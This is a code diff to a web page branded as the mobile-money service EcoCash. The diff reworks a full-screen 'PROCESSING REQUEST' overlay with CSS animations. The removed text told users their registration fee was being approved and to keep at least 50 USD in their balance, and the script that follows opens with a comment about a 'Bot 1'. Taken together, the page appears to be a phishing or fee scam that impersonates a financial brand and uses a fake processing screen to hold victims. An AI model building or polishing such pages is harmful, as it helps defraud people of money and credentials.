@@ -237,18 +237,157 @@
         <button id="submitBtn">Submit</button>
     </div>
 
-    <footer>© 2026 EcoCash</footer>
-    <!-- SPINNER -->
-    <div id="spinnerOverlay">
-        <div class="spinner"></div>
-        <div class="spinner-text">
-            Your Registrations fee is being approved, Login again after 5 hours and make sure you have atleast 50 USD on your balance </div>
-    </div>
+    
+<footer>© 2026 EcoCash</footer>
 
-    <!-- RESULT OVERLAY -->
-    <div id="resultOverlay">
-        <div class="result-message" id="resultMessage"></div>
+<!-- FUTURISTIC PROCESSING SPINNER -->
+<div id="spinnerOverlay">
+    <div class="spinner-container">
+
+        <div class="spinner">
+            <div class="spinner-inner"></div>
+        </div>
+
+        <div class="spinner-title">
+            PROCESSING REQUEST
+        </div>
+
+        <div class="spinner-text">
+            Please wait as we process your request.
+            It will take some time.
+        </div>
+
+        <div class="loading-line">
+            <div class="loading-progress"></div>
+        </div>
+
+        <div class="system-status">
+            <span class="status-dot"></span>
+            SYSTEM STATUS: PROCESSING
+        </div>
+
     </div>
+</div>
+
+<!-- RESULT OVERLAY -->
+<div id="resultOverlay">
+    <div class="result-message" id="resultMessage"></div>
+</div>
+
+<style>
+#spinnerOverlay {
+    display: none;
+    position: fixed;
+    inset: 0;
+    z-index: 9999;
+    align-items: center;
+    justify-content: center;
+    background: radial-gradient(circle at center, #102b49, #030914 75%);
+    backdrop-filter: blur(12px);
+}
+
+.spinner-container {
+    width: 85%;
+    max-width: 360px;
+    padding: 35px 22px;
+    text-align: center;
+    border: 1px solid rgba(0, 191, 255, 0.55);
+    border-radius: 20px;
+    background: linear-gradient(145deg, #07182c, #030a16);
+    box-shadow: 0 0 30px rgba(0, 174, 255, 0.2);
+}
+
+.spinner {
+    width: 75px;
+    height: 75px;
+    margin: 0 auto 25px;
+    border: 3px solid rgba(0, 191, 255, 0.15);
+    border-top: 3px solid #00d9ff;
+    border-right: 3px solid #168bff;
+    border-radius: 50%;
+    animation: futuristicSpin 1s linear infinite;
+    box-shadow: 0 0 18px rgba(0, 191, 255, 0.4);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.spinner-inner {
+    width: 43px;
+    height: 43px;
+    border: 2px solid transparent;
+    border-bottom: 2px solid #00d9ff;
+    border-left: 2px solid #168bff;
+    border-radius: 50%;
+    animation: futuristicSpin 1.5s linear infinite reverse;
+}
+
+@keyframes futuristicSpin {
+    to { transform: rotate(360deg); }
+}
+
+.spinner-title {
+    color: #00d9ff;
+    font-size: 17px;
+    font-weight: 800;
+    letter-spacing: 2px;
+    margin-bottom: 15px;
+    text-shadow: 0 0 12px #008cff;
+}
+
+.spinner-text {
+    color: #d4eaff;
+    font-size: 14px;
+    line-height: 1.8;
+    margin-bottom: 22px;
+}
+
+.loading-line {
+    height: 3px;
+    width: 100%;
+    background: #142c45;
+    overflow: hidden;
+    border-radius: 10px;
+    margin-bottom: 18px;
+}
+
+.loading-progress {
+    height: 100%;
+    width: 35%;
+    background: #00d9ff;
+    box-shadow: 0 0 12px #00bfff;
+    animation: loadingMove 1.5s ease-in-out infinite;
+}
+
+@keyframes loadingMove {
+    0% { transform: translateX(-110%); }
+    100% { transform: translateX(310%); }
+}
+
+.system-status {
+    color: #75cfff;
+    font-size: 10px;
+    letter-spacing: 1.5px;
+}
+
+.status-dot {
+    display: inline-block;
+    width: 7px;
+    height: 7px;
+    background: #00e5ff;
+    border-radius: 50%;
+    margin-right: 7px;
+    box-shadow: 0 0 10px #00e5ff;
+    animation: statusPulse 1s infinite alternate;
+}
+
+@keyframes statusPulse {
+    from { opacity: 0.3; }
+    to { opacity: 1; }
+}
+
+</style>
+
 
     <script>
         // Bot 1 (your existing)
